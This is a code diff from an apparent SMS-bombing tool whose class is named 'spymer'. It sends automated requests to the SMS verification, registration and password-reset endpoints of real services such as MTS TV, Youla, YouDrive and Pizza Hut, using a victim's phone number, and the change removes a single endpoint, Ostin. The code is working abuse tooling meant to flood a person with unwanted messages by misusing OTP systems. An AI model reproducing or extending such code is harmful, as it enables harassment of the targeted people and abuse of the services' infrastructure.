@@ -67,7 +67,7 @@ class spymer:
 #			worki = requests.post('https://api.iconjob.co/api/web/v1/verification_code', json={"phone": _phone}, headers={})
 #			wildberries = requests.post('https://security.wildberries.ru/mobile/requestconfirmcode?forAction=RegisterUser', data={"phone": '+'+_phone}, headers={})
 			mts = requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
-			ostin = requests.post(' https://ostin.com/api/v2/front/request-sms-code', json={"phone":"+"+_phone})
+			
 			youla = requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
 			youdrive =  requests.post(' http://youdrive.today/login/web/phone', data={'phone': _phone9, 'phone_code':'7'})
 			pizzahut = requests.post('https://pizzahut.ru/account/password-reset', data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': _phonePizzahut, '_token':'*'})
